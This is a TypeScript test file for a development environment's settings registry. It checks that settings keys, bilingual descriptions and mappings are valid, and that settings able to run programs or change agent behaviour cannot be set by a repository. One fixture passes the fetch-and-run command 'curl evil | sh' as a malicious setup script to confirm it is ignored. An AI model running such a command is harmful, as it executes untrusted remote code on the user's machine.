import { describe, expect, test } from 'bun:test';
import { resolveSettings, SCHEMA, SETTINGS, settingProblems, settingsSections, validate } from '../registry';
import { ADE_SECTION_GROUPS, ADE_SETTINGS, SYSTEM_SECTION_GROUPS } from './index';
import { ORCA_MAP } from './orcaMap';

/** A row's Kingu key as a matcher: `<profile>` and `.*` stand for any segment(s). */
const matcher = (key: string) => new RegExp(`^${key.replace(/\./g, '\\.').replace('<profile>', '[a-z-]+').replace('\\.*', '\\..+')}$`);

describe('ADE settings registry (Orca settings as kingu.*)', () => {
	test('every ADE setting: kingu.* id, Thai then English description, a valid default, in a section', () => {
		const sections = settingsSections();
		for (const s of ADE_SETTINGS) {
			expect([s.id, s.id.startsWith('kingu.')]).toEqual([s.id, true]);
			expect([s.id, /[฀-๿]/.test(s.description), /\([A-Z][^)]*\.\)$/.test(s.description)]).toEqual([s.id, true, true]);
			// Thai first: the Thai text comes before the closing English sentence in parentheses.
			expect([s.id, s.description.search(/[฀-๿]/) < s.description.lastIndexOf(' (')]).toEqual([s.id, true]);
			expect([s.id, validate(s, s.default) !== undefined]).toEqual([s.id, true]);
			expect([s.id, [...ADE_SECTION_GROUPS, ...SYSTEM_SECTION_GROUPS].includes(s.group)]).toEqual([s.id, true]);
			expect([s.id, sections.some((sec) => sec.groups.includes(s.group))]).toEqual([s.id, true]);
			if ('enumDescriptions' in s && s.enumDescriptions) expect([s.id, s.enumDescriptions.length]).toEqual([s.id, s.enum!.length]);
		}
		expect(new Set(ADE_SETTINGS.map((s) => s.id)).size).toBe(ADE_SETTINGS.length);
		expect(ADE_SETTINGS.length).toBeGreaterThan(80);
	});

	test('every ADE setting is in the Orca map, and every mapped kingu.* key exists', () => {
		const rows = ORCA_MAP.filter(([, k, status]) => k && (status === 'added' || status === 'mapped') && k.startsWith('kingu.') && !k.startsWith('kingu.yaml'));
		for (const [orca, key] of rows) expect([orca, key, SETTINGS.some((s) => matcher(key!).test(s.id))]).toEqual([orca, key, true]);
		for (const s of ADE_SETTINGS) expect([s.id, rows.some(([, k]) => matcher(k!).test(s.id))]).toEqual([s.id, true]);
		// Rows mapped to a VS Code key point at a registered setting (kingu.yaml fields and keybindings.json aside).
		const vscode = ORCA_MAP.filter(([, k, status]) => k && status === 'mapped' && !k.startsWith('kingu.') && /^[a-z]+\.[A-Za-z.]+$/.test(k) && !k.endsWith('.json') && !/^(scripts|worktree)\./.test(k));
		for (const [orca, key] of vscode) expect([orca, key, SETTINGS.some((s) => s.id === key)]).toEqual([orca, key, true]);
		for (const [orca, kingu, status, note] of ORCA_MAP) {
			if (status === 'needs-feature' || status === 'not-applicable') expect([orca, kingu, !!note]).toEqual([orca, null, true]);
		}
	});

	test('what runs programs, sets agent flags or disables protections is user-only (or yours per repository)', () => {
		const userOnly = [
			'kingu.agent.cmdOverrides',
			'kingu.agent.claudeAgentTeams',
			'kingu.git.ai.agent',
			'kingu.git.ai.model',
			'kingu.git.ai.customCommand',
			'kingu.worktree.openIn',
			'kingu.worktree.alwaysForceDelete',
			'kingu.terminal.quickCommands',
			'kingu.agent.notifications.hiddenWorkspaces',
			...SETTINGS.filter((s) => s.id.startsWith('kingu.agent.env.')).map((s) => s.id)
		];
		const yours = ['kingu.repo.setupScript', 'kingu.repo.archiveScript', 'kingu.repo.issueCommand', 'kingu.repo.scriptSource', 'kingu.repo.symlinkPaths', 'kingu.git.ai.commitInstructions', 'kingu.git.ai.prInstructions', 'kingu.git.ai.branchNameInstructions'];
		for (const id of userOnly) expect([id, SCHEMA.get(id)?.scope]).toEqual([id, 'application']);
		for (const id of yours) expect([id, SCHEMA.get(id)?.scope]).toEqual([id, 'local']);
		// The repository's .kingu/settings.json sets none of them; the problems list says why.
		const ws: Record<string, unknown> = Object.fromEntries([...userOnly, ...yours].map((id) => [id, SCHEMA.get(id)!.default]));
		const problems = settingProblems(ws, 'workspace');
		for (const id of [...userOnly, ...yours]) expect([id, problems.some((p) => p.id === id)]).toEqual([id, true]);
		const m = resolveSettings({}, { 'kingu.repo.setupScript': 'curl evil | sh', 'kingu.agent.cmdOverrides': { claude: '/tmp/x' } });
		expect([m.get('kingu.repo.setupScript')?.value, m.get('kingu.agent.cmdOverrides')?.value]).toEqual(['', {}]);
	});
});
